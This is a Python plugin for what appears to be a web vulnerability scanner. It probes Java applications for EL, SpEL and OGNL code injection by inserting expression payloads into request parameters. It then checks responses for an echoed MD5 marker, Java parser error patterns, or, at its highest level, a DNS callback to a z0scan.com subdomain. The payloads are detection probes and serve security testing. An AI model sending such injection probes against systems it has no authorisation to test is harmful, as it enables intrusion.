#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from api import generateResponse, VulType, Type, PluginBase, conf, Threads, PLACE
from lib.helper.helper_sensitive import sensitive_page_error_message_check
import re
import random
import hashlib

class Z0SCAN(PluginBase):
    name = "codei-java"
    desc = "Java Code Injection Vulnerability Scanner (EL/SpEL/OGNL)"
    version = "2025.9.2"
    risk = 3

    def audit(self):
        if conf.level == 0 or not self.risk in conf.risk or self.fingerprints.waf:
            return
        if not "java" in self.fingerprints.programing:
            return

        randint = random.randint(10120, 10240)
        verify_result = hashlib.md5(str(randint).encode()).hexdigest()

        _java_payloads = [
            "${T(java.lang.String).valueOf(" + str(randint) + ").concat('" + verify_result + "')}",
            "#{T(java.lang.String).valueOf(" + str(randint) + ") + '" + verify_result + "'}",
            "%{" + verify_result + "}",
            "';System.out.print('" + verify_result + "');//",
            "\";System.out.print('" + verify_result + "');//",
            "${''.getClass().forName('java.lang.String').getConstructor(String.class).newInstance('" + verify_result + "')}"
        ]

        if conf.level == 3:
            _java_payloads += [
                "${T(java.net.InetAddress).getByName('" + verify_result + ".z0scan.com')}",
                "#{T(java.lang.String).valueOf(" + str(randint) + ").hashCode() + '" + verify_result + "'}"
            ]

        iterdatas = self.generateItemdatas()
        if not iterdatas:
            return
        z0thread = Threads(name=self.name)
        z0thread.submit(self.process, iterdatas, _java_payloads, verify_result)

    def process(self, _, _payloads, verify_result):
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return

        java_error_regx = r'Java\.lang\.(ELException|SpelEvaluationException|OgnlException)|Syntax error in expression|Failed to parse expression'
        errors = None
        errors_raw = ()
        last_r = None

        for _payload in _payloads:
            modified_data = self.insertPayload({
                "key": k,
                "position": position,
                "payload": _payload
            })

            r = self.req(position, modified_data)
            if not r:
                continue
            last_r = r
            html = r.text.lower()

            if verify_result in html:
                result = self.generate_result()
                result.main({
                    "type": Type.REQUEST,
                    "url": self.requests.url,
                    "vultype": VulType.CODE_INJECTION,
                    "show": {
                        "Position": f"{position} >> {k}",
                        "Payload": _payload,
                    }
                })
                result.step("Request", {
                    "request": r.reqinfo,
                    "response": generateResponse(r),
                    "desc": f"Received verify code: {verify_result} (Java code executed successfully)"
                })
                self.success(result)
                return True

            if re.search(java_error_regx, html, re.I | re.S | re.M):
                result = self.generate_result()
                result.main({
                    "type": Type.REQUEST,
                    "url": self.requests.url,
                    "vultype": VulType.CODE_INJECTION,
                    "show": {
                        "Position": f"{position} >> {k}",
                        "Java Payload": _payload,
                        "Matched Error Pattern": java_error_regx
                    }
                })
                result.step("Request", {
                    "request": r.reqinfo,
                    "response": generateResponse(r),
                    "desc": f"Matched Java error pattern (payload triggered syntax error)"
                })
                self.success(result)
                return True

            if not errors:
                errors = sensitive_page_error_message_check(html)
                if errors:
                    errors_raw = (k, v)

        if errors and last_r:
            result = self.generate_result()
            key, value = errors_raw
            result.main({
                "type": Type.REQUEST,
                "url": self.requests.url,
                "vultype": VulType.SENSITIVE,
                "show": {
                    "Position": f"{position} >> {k}",
                    "Msg": "Sensitive Java error message detected in response"
                }
            })
            for m in errors:
                result.step("Request", {
                    "request": last_r.reqinfo,
                    "response": generateResponse(last_r),
                    "desc": f"Match Tool:{m['type']} Match Content:{m['text']}"
                })
            self.success(result)
